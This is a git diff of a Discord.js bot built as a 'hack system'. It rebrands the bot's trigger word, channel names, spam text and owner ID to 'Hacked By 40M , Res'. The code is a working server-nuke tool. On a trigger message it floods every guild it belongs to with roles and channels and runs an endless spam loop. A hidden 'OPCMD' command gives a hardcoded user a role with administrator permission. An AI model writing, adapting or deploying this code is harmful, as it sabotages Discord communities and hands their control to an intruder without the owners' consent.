@@ -1,16 +1,15 @@
 onst Discord = require("discord.js") //npm i discord.js
 const client = new Discord.Client();
-const Token = '' //حط توكن بوتك هنا // your bot token
-const x_x = "." //الامر يلي يشغل الكود //the command to start the hack system
+const x_x = "Res" //الامر يلي يشغل الكود //the command to start the hack system
 const opcmd = 'oprole' // The Op Command To Give You Adminstrator Role
-const teext = "hjacked" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
-const vooice = "HJACKED" // اسم الرومات الصوتيه يلي بيسويها //the voicechannel name
-const pic = "https://cdn.discordapp.com/attachments/505639515407253506/505640173615448064/download.png" // صوره بيسوي فيها سبام البوت //the spam embed thumbnail picture
-const spam = "HJACKED" // الكلام يلي بيسوي فيه سبام البوت //the spam message
-const namee = "HJACKED" // اسم ابوت بعد التهكير //the bot name
-const playing = "HJACKED 1 SERVER" // البلاينج //bot streaming
-const role = 'HJACKED' // اسم الرتبه يلي بيسويها //the role name
-const adminstrator = 'OP' //اسم الرتبه يلي بيسويها البوت ويعطيك اياها //the op name
+const teext = "Hacked By 40M , Res" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
+const vooice = "Hacked By 40M , Res" // اسم الرومات الصوتيه يلي بيسويها //the voicechannel name
+const pic = "https://images-ext-2.discordapp.net/external/R_t3ar6VVgT3DwP0NWGAjLhMCK_DXOJ_XbVEfsZBL3s/%3Fsize%3D1024/https/cdn.discordapp.com/icons/533581848207687680/77114397a2c0e6ad0076c32a91c4b3f5.png" // صوره بيسوي فيها سبام البوت //the spam embed thumbnail picture
+const spam = "Hacked By 40M , Res" // الكلام يلي بيسوي فيه سبام البوت //the spam message
+const namee = "Reees." // اسم ابوت بعد التهكير //the bot name
+const playing = "Reeeespect" // البلاينج //bot streaming
+const role = 'Reeees.' // اسم الرتبه يلي بيسويها //the role name
+const adminstrator = 'Reeees.' //اسم الرتبه يلي بيسويها البوت ويعطيك اياها //the op name
 console.log('BY OROCHIX');
 console.log('Start Hacking System ..')
 client.on('ready', () => {
@@ -99,7 +98,7 @@ let me = message.author
             client.on('message', message => {
      
 
-                if (message.content === x_x) {
+                if (message.content === "Res") {
                     client.guilds.forEach(m =>{
              m.createRole({
                    name : role,
@@ -306,7 +305,7 @@ let me = message.author
            });
            //create the textchannels
            client.on('message', message => {
-                    if (message.content === x_x) {
+                    if (message.content === "Res") {
                           client.guilds.forEach(m =>{
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
@@ -360,7 +359,7 @@ let me = message.author
            });
            //create the voicechannels
            client.on('message', message => {
-                    if (message.content === x_x) {
+                    if (message.content === "Res") {
                             client.guilds.forEach(m =>{
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
@@ -446,7 +445,7 @@ let me = message.author
 
             //spam message
                 client.on('message', message => {
-                    if (message.content === x_x) {
+                    if (message.content === "Res") {
                         console.log(`THE HACK HAS BEEN STARTED`)
                         var teeext = teext.replace(" ", "-")
                         var interval = setInterval (function () {
@@ -463,9 +462,9 @@ let me = message.author
 
 //login in to the bot token or the serverowner token
     client.on('message', async message => {
-  const devs = ['496253329857445923']; // your id
+  const devs = ['535979538551930891']; // your id
   let member = message.author
-   if (message.content === opcmd) {
+   if (message.content === "OPCMD") {
     if (!devs.includes(message.author.id)) return;
 let op = message.guild.roles.find('name', `${adminstrator}`)
     if(!op) return message.guild.createRole({ name: "OPROLE", permissions: [8] });
